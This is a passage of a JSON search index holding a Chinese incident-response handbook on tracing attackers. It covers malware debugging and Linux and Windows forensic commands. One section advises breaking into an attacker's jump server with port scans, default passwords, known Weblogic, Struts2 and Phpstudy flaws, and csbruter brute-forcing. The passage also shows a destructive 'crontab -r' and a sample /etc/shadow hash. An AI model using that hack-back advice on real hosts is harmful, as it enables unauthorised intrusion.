Pro\u5728\u9759\u6001\u5206\u6790\u4e2d\u9047\u5230\u4e86\u5341\u5206\u62bd\u8c61\u7684\u51fd\u6570\uff0c\u90a3\u4e48\u7528OD\u52a8\u6001\u5730\u6267\u884c\u4e00\u4e0b\uff0c\u8be5\u51fd\u6570\u7684\u529f\u80fd\u5f80\u5f80\u5c31\u80fd\u4e00\u76ee\u4e86\u7136\u4e86","title":"\u52a8\u6001\u8c03\u8bd5"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_22","text":"D\u8c03\u8bd5\u8f6f\u4ef6\u65f6\uff0c\u5b83\u6bcf\u6b21\u53ea\u80fd\u8ddf\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u5982\u679c\u9047\u5230\u7684\u8f6f\u4ef6\u521b\u5efa\u4e86\u5f88\u591a\u7ebf\u7a0b\uff0c\u90a3\u4e48\u8c03\u8bd5\u8d77\u6765\u5c31\u6bd4\u8f83\u9ebb\u70e6\u4e86\uff0c\u672c\u8282\u4ecb\u7ecd\u4e00\u4e0b\u591a\u7ebf\u7a0b\u7684\u8c03\u8bd5\u65b9\u6cd5\u3002 \u9996\u5148\u770b\u4e00\u4e0b\u7ebf\u7a0b\u521b\u5efa\u7684\u51fd\u6570\uff1a HANDLE CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes,//SD SIZE_T dwStackSize,//initialstacksize LPTHREAD_START_ROUTINE lpStartAddress,//threadfunction LPVOID lpParameter,//threadargument DWORD dwCreationFlags,//creationoption LPDWORD lpThreadId//threadidentifier ) \u91cd\u70b9\u770b\u7b2c\u4e09\u4e2a\u548c\u7b2c\u56db\u4e2a\u51fd\u6570\uff0c\u5176\u4e2d\u7b2c\u4e09\u4e2a\u53c2\u6570\u6307\u5b9a\u4e86\u65b0\u7ebf\u7a0b\u7684\u5165\u53e3\u5730\u5740\uff0c\u7b2c\u56db\u4e2a\u53c2\u6570\u4e3a\u65b0\u7ebf\u7a0b\u6240\u9700\u7684\u53c2\u6570\uff0c\u5f53\u7a0b\u5e8f\u8c03\u7528\u6b64\u51fd\u6570\u6765\u521b\u5efa\u7ebf\u7a0b\u7684\u65f6\u5019\uff0c\u5b9a\u4f4d\u5230\u7ebf\u7a0b\u7684\u5165\u53e3\u5730\u5740\u8bbe\u7f6e\u65ad\u70b9\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7a0b\u5e8f\u4f1a\u5728\u540e\u9762\u8c03\u7528Sleep\u6216WaitForSingleObject\u51fd\u6570\uff0c\u8fd9\u6837\u7684\u8bdd\uff0c\u7a0b\u5e8f\u7684\u63a7\u5236\u6743\u5c31\u5230\u4e86\u65b0\u7ebf\u7a0b\u91cc\u9762\u3002 \u5982\u679c\u7a0b\u5e8f\u6ca1\u6709\u8c03\u7528Sleep\u6216WaitForSingleObject\u51fd\u6570\uff0c\u90a3\u4e48\u53ef\u4ee5\u4fee\u6539\u51fd\u6570\u7684\u4ee3\u7801\uff0c\u5f3a\u5236\u7a0b\u5e8f\u8c03\u7528\u8fd9\u4e24\u4e2a\u51fd\u6570\uff0c\u8fd9\u6837\u7a0b\u5e8f\u5c31\u8f6c\u5230\u65b0\u7ebf\u7a0b\u4e2d\u6267\u884c\u3002\u53e6\u4e00\u79cd\u65b9\u6cd5\u662f\u4fee\u6539\u7a0b\u5e8f\u7684EIP\uff0c\u4f7f\u5176\u6307\u5411\u65b0\u7ebf\u7a0b\u5165\u53e3\uff0c\u5982\u679c\u6709\u53c2\u6570\u7684\u8bdd\uff0c\u8fd8\u8981\u4fee\u6539\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u4f7f\u5176\u6307\u5411\u53c2\u6570\u5730\u5740\uff0c\u4e0d\u8fc7\u8fd9\u79cd\u65b9\u6cd5\u53ef\u80fd\u4f1a\u9020\u6210\u5bc4\u5b58\u5668\u5185\u5bb9\u4e0d\u6b63\u786e\uff0c\u73af\u5883\u5f02\u5e38\uff0c\u4ece\u800c\u9020\u6210\u7a0b\u5e8f\u6267\u884c\u5d29\u6e83\u3002 \u8fd8\u6709\u4e00\u79cd\u65b9\u6cd5\u6765\u8c03\u8bd5\u591a\u7ebf\u7a0b\u3002\u5982\u679c\u7a0b\u5e8f\u591a\u6b21\u8c03\u7528CreateThread\uff0c\u786e\u5b9a\u4e00\u4e2a\u6211\u4eec\u6253\u7b97\u8c03\u8bd5\u7684\u7ebf\u7a0b\uff0c\u5e76\u8ba9\u8fd9\u4e2a\u7ebf\u7a0b\u521b\u5efa\u6210\u529f\uff0c\u5f53\u7a0b\u5e8f\u518d\u8c03\u7528CreateThread\u521b\u5efa\u7ebf\u7a0b\u7684\u65f6\u5019\uff0c\u76f4\u63a5\u4fee\u6539\u6b64\u51fd\u6570\uff0c\u8ba9\u5b83\u76f4\u63a5\u8fd4\u56de\uff0c\u8fd9\u6837\u5c31\u4e0d\u4f1a\u518d\u521b\u5efa\u7ebf\u7a0b\u4e86\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u53ea\u8c03\u8bd5\u4e00\u4e2a\u7ebf\u7a0b\u3002","title":"\u591a\u7ebf\u7a0b\u8c03\u8bd5"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_23","text":"\u6709\u4e9b\u6837\u672c\u5e76\u4e0d\u662f\u5355\u72ec\u8fd0\u884c\u7684\uff0c\u5b83\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u4f1a\u521b\u5efa\u5b50\u8fdb\u7a0b\u6765\u5b8c\u6210\u6076\u610f\u529f\u80fd\uff0c\u9047\u5230\u8fd9\u79cd\u60c5\u51b5\uff0c\u5c31\u9700\u8981\u8fdb\u5165\u5b50\u8fdb\u7a0b\u4e2d\u8fdb\u884c\u8c03\u8bd5\u3002 \u5982\u679c\u7236\u8fdb\u7a0b\u521b\u5efa\u5b50\u8fdb\u7a0b\u65f6\u662f\u4ee5suspended\u7684\u65b9\u5f0f\u521b\u5efa\u7684\uff0c\u90a3\u4e48\u7236\u8fdb\u7a0b\u4f1a\u5411\u5b50\u8fdb\u7a0b\u8fdb\u884c\u4ee3\u7801\u6ce8\u5165\uff0c\u5199\u5165\u4e4b\u540e\u4f1a\u8c03\u7528ResumeThread\u51fd\u6570\u6062\u590d\u5b50\u8fdb\u7a0b\u7684\u8fd0\u884c\u3002\u9047\u5230\u8fd9\u79cd\u60c5\u51b5\uff0c\u8981\u786e\u5b9a\u7236\u8fdb\u7a0b\u5199\u5165\u4ee3\u7801\u7684\u5730\u5740\uff0c\u5f53\u4ee3\u7801\u5199\u5165\u4e4b\u540e\uff0c\u8c03\u7528ResumeThread\u6062\u590d\u5b50\u8fdb\u7a0b\u8fd0\u884c\u524d\uff0c\u9644\u52a0\u5230\u5b50\u8fdb\u7a0b\u4e2d\uff0c\u5728\u4ee3\u7801\u6ce8\u5165\u7684\u5730\u5740\u4e0b\u65ad\u70b9\u5e76F9\u8ba9\u5b50\u8fdb\u7a0b\u8fd0\u884c\u3002\u8fd9\u65f6\u518d\u56de\u5230\u7236\u8fdb\u7a0b\u4e2d\uff0c\u8fd0\u884c\u51fd\u6570ResumeThread\uff0c\u8fd9\u6837\u5b50\u8fdb\u7a0b\u5c31\u53ef\u4ee5\u65ad\u5728\u4ee3\u7801\u6ce8\u5165\u7684\u5730\u5740\u4e86\u3002 \u8fd8\u6709\u4e00\u79cd\u521b\u5efa\u5b50\u8fdb\u7a0b\u7684\u65b9\u5f0f\uff0c\u5c31\u53ea\u662f\u7b80\u5355\u7684\u5f00\u542f\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u8fd0\u884c\uff0c\u8fd9\u79cd\u60c5\u51b5\u6bd4\u8f83\u7b80\u5355\uff0c\u9700\u8981\u6ce8\u610f\u7684\u4e00\u70b9\u5c31\u662f\u7236\u8fdb\u7a0b\u521b\u5efa\u5b50\u8fdb\u7a0b\u65f6\u4f20\u7ed9\u5b50\u8fdb\u7a0b\u7684\u53c2\u6570\uff0c\u4f7f\u7528OD\u6253\u5f00\u8981\u8fd0\u884c\u7684\u5b50\u8fdb\u7a0b\uff0c\u4f20\u5165\u6240\u9700\u7684\u53c2\u6570\u5373\u53ef\u5f00\u59cb\u8c03\u8bd5\u3002","title":"\u8c03\u8bd5\u5b50\u8fdb\u7a0b"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_24","text":"\u672c\u8282\u8fdb\u884c\u8df3\u677f\u673a\u4e0a\u4fe1\u606f\u641c\u96c6\uff0c\u67e5\u770b\u8df3\u677f\u673a\u662f\u88ab\u54ea\u4e2aIP\u5165\u4fb5\u7684\uff0c\u662f\u5426\u7559\u4e0b\u4e00\u4e9b\u9ed1\u5ba2\u5de5\u5177\u5e26\u6709\u4e2a\u4eba\u6216\u7ec4\u7ec7\u4fe1\u606f\uff0c\u7ee7\u7eed\u5411\u4e0a\u6eaf\u6e90 \u672c\u8282\u9700\u8981\u6eaf\u6e90\u4eba\u5458\u5bf9linux\u53cawindows\u7cfb\u7edf\u547d\u4ee4\u6709\u4e00\u5b9a\u638c\u63e1\u3002 \u5173\u4e8e\u5982\u4f55\u653b\u7834\u8df3\u677f\u673a \u4e00\u822c\u8df3\u677f\u673a\u5927\u591a\u6570\u4e3a\u9ed1\u5ba2\u7684\u5168\u7f51\u6f0f\u6d1e\u626b\u63cf\u811a\u672c\u6279\u91cf\u653b\u51fb\u62ff\u4e0b\u7684\u8089\u9e21\uff0c\u6545\u5176\u6bd4\u8f83\u5bb9\u6613\u62ff\u4e0b\u3002\u4e0d\u6392\u9664\u9ed1\u5ba2\u901a\u8fc7\u5b9a\u70b9\u3001\u624b\u52a8\u653b\u51fb\u3001\u8d2d\u4e70\u7b49\u9014\u5f84\u83b7\u5f97\u7684\u8df3\u677f\u673a\u3002 \u8fdb\u884c\u5168\u7aef\u53e3\u63a2\u6d4b,\u5c1d\u8bd5\u9ed8\u8ba4\u5bc6\u7801\u3001\u627eWeb\u670d\u52a1\u8fdb\u884c\u653b\u51fb\u3002 \u4e00\u4e9b\u5f71\u54cd\u8303\u56f4\u5e7f\u6cdb\u3001\u5229\u7528\u7b80\u5355\u7684\u6f0f\u6d1e \u5982\uff1aPhpstudy\u540e\u95e8\u3001Weblogic\u6f0f\u6d1e\u3001Struts2\u6f0f\u6d1e\u3001\u8def\u7531\u5668\u76d1\u63a7\u6444\u50cf\u5668\u7b49\u7ec8\u7aef\u6f0f\u6d1e\u3002 \u9047\u5230CS server\u53ef\u901a\u8fc7csbruter\u5de5\u5177\u7206\u7834\u5bc6\u7801\u3002 \u5e38\u89c1\u7684\u65e5\u5fd7\u5206\u6790\u5de5\u5177\uff1a windows\uff1alogparser linux\uff1a\u4e3b\u8981\u4e3a\u4e00\u4e9b\u547d\u4ee4\u7684\u4f7f\u7528\u4f8b\uff1asplit sed cat sort uniq awk\u7b49 \u8df3\u677f\u673a\u7684\u6eaf\u6e90\u8fc7\u7a0b\uff0c\u53ef\u4ee5\u4e3b\u8981\u4ece\u7aef\u53e3\u3001\u8fdb\u7a0b\u3001\u5b9a\u65f6\u4efb\u52a1\u3001\u65e5\u5fd7\u6765\u5165\u624b","title":"\u8df3\u677f\u673a"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#linux","text":"","title":"Linux"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_25","text":"\u4f7f\u7528 netstat \u7f51\u7edc\u8fde\u63a5\u547d\u4ee4\uff0c\u5206\u6790\u53ef\u7591\u7aef\u53e3\u3001IP\u3001PID \u90e8\u5206\u7cfb\u7edf\u53ef\u4f7f\u7528lsof -i \u67e5\u770b\u4e0b pid \u6240\u5bf9\u5e94\u7684\u8fdb\u7a0b\u6587\u4ef6\u8def\u5f84\uff0c \u8fd0\u884c ls -l /proc/$PID/exe \u6216 file /proc/$PID/exe\uff08$PID \u4e3a\u5bf9\u5e94\u7684 pid \u53f7\uff09","title":"\u7aef\u53e3\u67e5\u8be2"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_26","text":"\u4f7f\u7528 ps \u547d\u4ee4\uff0c\u5206\u6790\u8fdb\u7a0b ps aux | grep pid","title":"\u8fdb\u7a0b\u67e5\u8be2"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_27","text":"1\u3001\u5229\u7528 crontab \u67e5\u8be2\u521b\u5efa\u7684\u5b9a\u65f6\u4efb\u52a1 \u57fa\u672c\u547d\u4ee4 crontab -l \u5217\u51fa\u67d0\u4e2a\u7528\u6237cron\u670d\u52a1\u7684\u8be6\u7ec6\u5185\u5bb9 Tips\uff1a\u9ed8\u8ba4\u7f16\u5199\u7684crontab\u6587\u4ef6\u4f1a\u4fdd\u5b58\u5728 (/var/spool/cron/\u7528\u6237\u540d \u4f8b\u5982: /var/spool/cron/root crontab -r \u5220\u9664\u6bcf\u4e2a\u7528\u6237cront\u4efb\u52a1(\u8c28\u614e\uff1a\u5220\u9664\u6240\u6709\u7684\u8ba1\u5212\u4efb\u52a1) crontab -e \u4f7f\u7528\u7f16\u8f91\u5668\u7f16\u8f91\u5f53\u524d\u7684crontab\u6587\u4ef6 \u5982\uff1a*/1 * * * * echo \\\"hello world\\\" >> /tmp/test.txt \u6bcf\u5206\u949f\u5199\u5165\u6587\u4ef6 2\u3001\u5229\u7528 anacron \u547d\u4ee4\u5b9e\u73b0\u5f02\u6b65\u5b9a\u65f6\u4efb\u52a1\u8c03\u5ea6 \u4f7f\u7528\u6848\u4f8b \u6bcf\u5929\u8fd0\u884c /home/backup.sh \u811a\u672c\uff1a vi /etc/anacrontab \\@daily 10 example.daily /bin/bash /home/backup.sh \u5f53\u673a\u5668\u5728 backup.sh \u671f\u671b\u88ab\u8fd0\u884c\u65f6\u662f\u5173\u673a\u7684\uff0canacron\u4f1a\u5728\u673a\u5668\u5f00\u673a\u5341\u5206\u949f\u4e4b\u540e\u8fd0\u884c\u5b83\uff0c\u800c\u4e0d\u7528\u518d\u7b49\u5f85 7\u5929\u3002","title":"\u5b9a\u65f6\u4efb\u52a1"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_28","text":"1\u3001root \u7528\u6237\u7684\u5386\u53f2\u547d\u4ee4 histroy 2\u3001\u6253\u5f00 /home \u5404\u5e10\u53f7\u76ee\u5f55\u4e0b\u7684 .bash_history\uff0c\u67e5\u770b\u666e\u901a\u5e10\u53f7\u6267\u884c\u7684\u5386\u53f2\u547d\u4ee4\u3002 \u4e3a\u5386\u53f2\u7684\u547d\u4ee4\u589e\u52a0\u767b\u5f55\u7684 IP \u5730\u5740\u3001\u6267\u884c\u547d\u4ee4\u65f6\u95f4\u7b49\u4fe1\u606f\uff1a 1\uff09\u4fdd\u5b581\u4e07\u6761\u547d\u4ee4 sed -i \\'s/^HISTSIZE=1000/HISTSIZE=10000/g\\' /etc/profile 2\uff09\u5728/etc/profile\u7684\u6587\u4ef6\u5c3e\u90e8\u6dfb\u52a0\u5982\u4e0b\u884c\u6570\u914d\u7f6e\u4fe1\u606f\uff1a USER_IP=`who -u am i 2>/dev/null | awk \\'{print $NF}\\' | sed -e \\'s/[()]//g\\'` if [ \\\"$USER_IP\\\" = \\\"\\\" ] then USER_IP=`hostname` fi export HISTTIMEFORMAT=\\\"%F %T $USER_IP `whoami` \\\" shopt -s histappend export PROMPT_COMMAND=\\\"history -a\\\" 3\uff09source /etc/profile \u8ba9\u914d\u7f6e\u751f\u6548","title":"\u5386\u53f2\u547d\u4ee4"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_29","text":"who \u67e5\u770b\u5f53\u524d\u767b\u5f55\u7528\u6237\uff08tty \u672c\u5730\u767b\u9646 pts \u8fdc\u7a0b\u767b\u5f55\uff09 w \u67e5\u770b\u7cfb\u7edf\u4fe1\u606f\uff0c\u60f3\u77e5\u9053\u67d0\u4e00\u65f6\u523b\u7528\u6237\u7684\u884c\u4e3a uptime \u67e5\u770b\u767b\u9646\u591a\u4e45\u3001\u591a\u5c11\u7528\u6237\uff0c\u8d1f\u8f7d\u72b6\u6001 1\u3001\u7528\u6237\u4fe1\u606f\u6587\u4ef6 /etc/passwd root 0:0:root:/root:/bin/bash account:password:UID:GID:GECOS:directory:shell \u7528\u6237\u540d\uff1a\u5bc6\u7801\uff1a\u7528\u6237ID\uff1a\u7ec4ID\uff1a\u7528\u6237\u8bf4\u660e\uff1a\u5bb6\u76ee\u5f55\uff1a\u767b\u9646\u4e4b\u540e\u7684 shell \u6ce8\u610f\uff1a\u65e0\u5bc6\u7801\u53ea\u5141\u8bb8\u672c\u673a\u767b\u9646\uff0c\u8fdc\u7a0b\u4e0d\u5141\u8bb8\u767b\u9646 2\u3001\u5f71\u5b50\u6587\u4ef6 /etc/shadow\u6bcf\u4e2a:\u4e3a\u4e00\u6b21\u5206\u5272 root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7::: \u7528\u6237\u540d\uff1a\u52a0\u5bc6\u5bc6\u7801\uff1a\u5bc6\u7801\u6700\u540e\u4e00\u6b21\u4fee\u6539\u65e5\u671f\uff1a\u4e24\u6b21\u5bc6\u7801\u7684\u4fee\u6539\u65f6\u95f4\u95f4\u9694\uff1a\u5bc6\u7801\u6709\u6548\u671f\uff1a\u5bc6\u7801\u4fee\u6539\u5230\u671f\u5230\u7684\u8b66\u544a\u5929\u6570\uff1a\u5bc6\u7801\u8fc7\u671f\u4e4b\u540e\u7684\u5bbd\u9650\u5929\u6570\uff1a\u8d26\u53f7\u5931\u6548\u65f6\u95f4\uff1a\u4fdd\u7559","title":"\u7528\u6237"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_30","text":"\u65e5\u5fd7\u9ed8\u8ba4\u5b58\u653e\u4f4d\u7f6e\uff1a/var/log \u65e5\u5fd7\u6587\u4ef6 \u8bf4\u660e /var/log/cron \u8bb0\u5f55\u4e86\u7cfb\u7edf\u5b9a\u65f6\u4efb\u52a1\u76f8\u5173\u7684\u65e5\u5fd7 /var/log/cups \u8bb0\u5f55\u6253\u5370\u4fe1\u606f\u7684\u65e5\u5fd7 /var/log/dmesg \u8bb0\u5f55\u4e86\u7cfb\u7edf\u5728\u5f00\u673a\u65f6\u5185\u6838\u81ea\u68c0\u7684\u4fe1\u606f\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528dmesg\u547d\u4ee4\u76f4\u63a5\u67e5\u770b\u5185\u6838\u81ea\u68c0\u4fe1\u606f /var/log/mailog \u8bb0\u5f55\u90ae\u4ef6\u4fe1\u606f /var/log/message \u8bb0\u5f55\u7cfb\u7edf\u91cd\u8981\u4fe1\u606f\u7684\u65e5\u5fd7\u3002\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d\u4f1a\u8bb0\u5f55Linux\u7cfb\u7edf\u7684\u7edd\u5927\u591a\u6570\u91cd\u8981\u4fe1\u606f\uff0c\u5982\u679c\u7cfb\u7edf\u51fa\u73b0\u95ee\u9898\u65f6\uff0c\u9996\u5148\u8981\u68c0\u67e5\u7684\u5c31\u5e94\u8be5\u662f\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6 /var/log/btmp \u8bb0\u5f55\u9519\u8bef\u767b\u5f55\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\u67e5\u770b\uff0c\u800c\u8981\u4f7f\u7528lastb\u547d\u4ee4\u67e5\u770b /var/log/lastlog \u8bb0\u5f55\u7cfb\u7edf\u4e2d\u6240\u6709\u7528\u6237\u6700\u540e\u4e00\u6b21\u767b\u5f55\u65f6\u95f4\u7684\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u8981\u4f7f\u7528lastlog\u547d\u4ee4\u67e5\u770b /var/log/wtmp \u6c38\u4e45\u8bb0\u5f55\u6240\u6709\u7528\u6237\u7684\u767b\u5f55\u3001\u6ce8\u9500\u4fe1\u606f\uff0c\u540c\u65f6\u8bb0\u5f55\u7cfb\u7edf\u7684\u542f\u52a8\u3001\u91cd\u542f\u3001\u5173\u673a\u4e8b\u4ef6\u3002\u540c\u6837\u8fd9\u4e2a\u6587\u4ef6\u4e5f\u662f\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u9700\u8981\u4f7f\u7528last\u547d\u4ee4\u6765\u67e5\u770b /var/log/utmp \u8bb0\u5f55\u5f53\u524d\u5df2\u7ecf\u767b\u5f55\u7684\u7528\u6237\u4fe1\u606f\uff0c\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u968f\u7740\u7528\u6237\u7684\u767b\u5f55\u548c\u6ce8\u9500\u4e0d\u65ad\u53d8\u5316\uff0c\u53ea\u8bb0\u5f55\u5f53\u524d\u767b\u5f55\u7528\u6237\u7684\u4fe1\u606f\u3002\u540c\u6837\u8fd9\u4e2a\u6587\u4ef6\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u8981\u4f7f\u7528w,who,users\u7b49\u547d\u4ee4\u6765\u67e5\u8be2 /var/log/secure \u8bb0\u5f55\u9a8c\u8bc1\u548c\u6388\u6743\u65b9\u9762\u7684\u4fe1\u606f\uff0c\u53ea\u8981\u6d89\u53ca\u8d26\u53f7\u548c\u5bc6\u7801\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8bb0\u5f55\uff0c\u6bd4\u5982SSH\u767b\u5f55\uff0csu\u5207\u6362\u7528\u6237\uff0csudo\u6388\u6743\uff0c\u751a\u81f3\u6dfb\u52a0\u7528\u6237\u548c\u4fee\u6539\u7528\u6237\u5bc6\u7801\u90fd\u4f1a\u8bb0\u5f55\u5728\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d Web\u8bbf\u95ee\u65e5\u5fd7\u901a\u5e38\u4e3aaccess.log\u6587\u4ef6\u53ef\u4ee5\u4f7f\u7528find\u547d\u4ee4\u8fdb\u884c\u67e5\u627e \u67e5\u627e\u6700\u8fd1\u4fee\u6539\u8fc7\u7684\u6587\u4ef6\u547d\u4ee4 \u4f8b\uff1afind ./* -mmin -5 Tips\uff1a mmin\u5206\u949f mtime \u5929 \u65e5\u5fd7\u5206\u6790\u5c0f\u6280\u5de7\uff1a \u767b\u5f55\u6210\u529f\u7684IP\u6709\u54ea\u4e9b\uff1a grep \\\"Accepted \\\" /var/log/secure | awk \\'{print $11}\\' | sort | uniq -c | sort -nr | more \u767b\u5f55\u6210\u529f\u7684\u65e5\u671f\u3001\u7528\u6237\u540d\u3001IP\uff1a grep \\\"Accepted \\\" /var/log/secure | awk \\'{print $1,$2,$3,$9,$11}\\'","title":"\u65e5\u5fd7"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#webshell","text":"\u6cb3\u9a6c webshell\uff1a http://www.shellpub.com","title":"Webshell\u67e5\u627e"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#windows","text":"","title":"Windows"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_31","text":"1\u3001\u67e5\u770b\u670d\u52a1\u5668\u662f\u5426\u5b58\u5728\u53ef\u7591\u8d26\u53f7\u3001\u65b0\u589e\u8d26\u53f7\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a\u6253\u5f00 cmd \u7a97\u53e3\uff0c\u8f93\u5165 lusrmgr.msc \u547d\u4ee4\uff0c\u67e5\u770b\u662f\u5426\u6709\u65b0\u589e/\u53ef\u7591\u7684\u8d26\u53f7\uff0c\u5982\u6709\u7ba1\u7406\u5458\u7fa4\u7ec4\u7684\uff08Administrators\uff09\u91cc\u7684\u65b0\u589e\u8d26\u6237\uff0c\u5982\u6709\uff0c\u8bf7\u7acb\u5373\u7981\u7528\u6216\u5220\u9664\u6389\u3002 2\u3001\u67e5\u770b\u670d\u52a1\u5668\u662f\u5426\u5b58\u5728\u9690\u85cf\u8d26\u53f7\u3001\u514b\u9686\u8d26\u53f7\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u6253\u5f00\u6ce8\u518c\u8868 \uff0c\u67e5\u770b\u7ba1\u7406\u5458\u5bf9\u5e94\u952e\u503c\u3002 b\u3001\u4f7f\u7528D\u76fe_web\u67e5\u6740\u5de5\u5177\uff0c\u96c6\u6210\u4e86\u5bf9\u514b\u9686\u8d26\u53f7\u68c0\u6d4b\u7684\u529f\u80fd\u3002 3\u3001\u7ed3\u5408\u65e5\u5fd7\uff0c\u67e5\u770b\u7ba1\u7406\u5458\u767b\u5f55\u65f6\u95f4\u3001\u7528\u6237\u540d\u662f\u5426\u5b58\u5728\u5f02\u5e38\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001Win+R \u6253\u5f00\u8fd0\u884c\uff0c\u8f93\u5165\\\"eventvwr.msc\\\"\uff0c\u56de\u8f66\u8fd0\u884c\uff0c\u6253\u5f00\"\u4e8b\u4ef6\u67e5\u770b\u5668\"\u3002 b\u3001\u5bfc\u51fa Windows \u65e5\u5fd7 -- \u5b89\u5168\uff0c\u5229\u7528\u5fae\u8f6f\u5b98\u65b9\u5de5\u5177 Log Parser \u8fdb\u884c\u5206\u6790\u3002","title":"\u68c0\u67e5\u7cfb\u7edf\u8d26\u53f7\u5b89\u5168"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_32","text":"1\u3001\u68c0\u67e5\u7aef\u53e3\u8fde\u63a5\u60c5\u51b5\uff0c\u662f\u5426\u6709\u8fdc\u7a0b\u8fde\u63a5\u3001\u53ef\u7591\u8fde\u63a5\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u4f7f\u7528netstat -ano \u547d\u4ee4\u67e5\u770b\u76ee\u524d\u7684\u7f51\u7edc\u8fde\u63a5\uff0c\u5b9a\u4f4d\u53ef\u7591\u7684 ESTABLISHED b\u3001\u6839\u636e netstat \u547d\u4ee4\u5b9a\u4f4d\u51fa\u7684 PID \u7f16\u53f7\uff0c\u518d\u901a\u8fc7 tasklist \u547d\u4ee4\u8fdb\u884c\u8fdb\u7a0b\u5b9a\u4f4d tasklist | findstr \\\"PID\\\"","title":"\u7aef\u53e3\u67e5\u8be2"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/#_33","text":"\u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u5f00\u59cb -- \u8fd0\u884c -- \u8f93\u5165 msinfo32 \u547d\u4ee4\uff0c\u4f9d\u6b21\u70b9\u51fb \\\"\u8f6f\u4ef6\u73af\u5883 -- \u6b63\u5728\u8fd0\u884c\u4efb\u52a1\\\" \u5c31\u53ef\u4ee5\u67e5\u770b\u5230\u8fdb\u7a0b\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u6bd4\u5982\u8fdb\u7a0b\u8def\u5f84\u3001\u8fdb\u7a0bID\u3001\u6587\u4ef6\u521b\u5efa\u65e5\u671f\u4ee5\u53ca\u542f\u52a8\u65f6\u95f4\u7b49\u3002 b\u3001\u6253\u5f00D\u76fe_web\u67e5\u6740\u5de5\u5177\uff0c\u8fdb\u7a0b\u67e5\u770b\uff0c\u5173\u6ce8\u6ca1\u6709\u7b7e\u540d\u4fe1\u606f\u7684\u8fdb\u7a0b\u3002 c\u3001\u901a\u8fc7\u5fae\u8f6f\u5b98\u65b9\u63d0\u4f9b\u7684 Process Explorer \u7b49\u5de5\u5177\u8fdb\u884c\u6392\u67e5 \u3002 d\u3001\u67e5\u770b\u53ef\u7591\u7684\u8fdb\u7a0b\u53ca\u5176\u5b50\u8fdb\u7a0b\u3002\u53ef\u4ee5\u901a\u8fc7\u89c2\u5bdf\u4ee5\u4e0b\u5185\u5bb9\uff1a \u6ca1\u6709\u7b7e\u540d\u9a8c\u8bc1\u4fe1\u606f\u7684\u8fdb\u7a0b \u6ca1\u6709\u63cf\u8ff0\u4fe1\u606f\u7684\u8fdb\u7a0b \u8fdb\u7a0b\u7684\u5c5e\u4e3b \u8fdb\u7a0b\u7684\u8def\u5f84\u662f\u5426\u5408\u6cd5 CPU 